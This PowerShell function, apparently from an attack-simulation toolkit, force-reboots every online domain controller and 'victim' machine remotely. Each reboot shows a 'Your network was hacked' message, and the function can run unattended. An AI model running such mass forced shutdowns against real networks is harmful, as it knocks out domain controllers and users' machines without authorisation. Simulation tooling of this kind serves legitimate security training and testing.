function Restart-VictimMachines {

    $CurrentFunction = Get-FunctionName
    Write-Log -Message "### Start Function $CurrentFunction ###"
    $StartRunTime = (Get-Date).ToString($Script:DateFormatLog)
    #################### main code | out- host #####################

    Invoke-Output -Type Header -Message "TRY to reboot all DCs and Victim machine"

    $Script:AllDCs | Select-Object Online, Root_Domain, FQDN, RODC, OperatingSystem | ft

    $UseCase = Get-ASConfig -Setting "usecase"
    $commment = "$UseCase | Your network was hacked. All machines will be rebooted in $Script:ASTime2Reboot seconds!!!!"

    write-host ""
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text "shutdown ", "/r /f /t ", "$Script:ASTime2Reboot ", "/c ", "$commment"  `
        -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV
    Write-Host  ""   

    If (-not $UnAttended) {
        pause
    }

    $commment = "$UseCase | Your network was hacked. `nAll machines will be rebooted in $Script:ASTime2Reboot seconds!!"

    foreach ($computer in $Script:AllDCs) {
        $remotemachine = $computer.FQDN
        $os = $computer.operatingSystem

        # check if the computer is online
        IF (Test-Connection -BufferSize 32 -Count 1 -ComputerName $remotemachine -Quiet) {

            If ($env:COMPUTERNAME -ne $computer.name) {
                If ($os -like 'Windows 1*') {
                    # only for Windows 10 machines
                    Invoke-output -Type Bullet -Message "Try to reboot Windows PC     - $remotemachine"
                    net use \\$remotemachine\ipc$
                    shutdown /r /f /c $commment /t $Script:ASTime2Reboot /m \\$remotemachine
                }
                elseif ($os -like 'Windows 7*') {
                    Invoke-output -Type Bullet -Message "Try to reboot Windows PC     - $remotemachine"
                    shutdown /r /f /c $commment /t $Script:ASTime2Reboot /m \\$remotemachine
                }
                else {
                    Invoke-output -Type Bullet -Message "Try to reboot Windows Server - $remotemachine"
                    Write-Host "Try to reboot Windows Server - $remotemachine"
                    shutdown /r /f /c $commment /t $Script:ASTime2Reboot /m \\$remotemachine
                }
            }
        } #end if Test-Connection
        Else {
            Invoke-Output -Type Warn -Message "Remote machine $remotemachine is down!"
        } 

    } 

    # last, but not least
    #Invoke-output -Type Bullet -Message "Try to reboot Local machine - $remotemachine"
    #shutdown /r /f /c $commment /t $Script:ASTime2Reboot /m \\$env:COMPUTERNAME

    ######################## main code ############################
    $runtime = Get-RunTime -StartRunTime $StartRunTime
    Write-Log -Message "    Run Time: $runtime [h] ###"
    Write-Log -Message "### End Function $CurrentFunction ###"
}
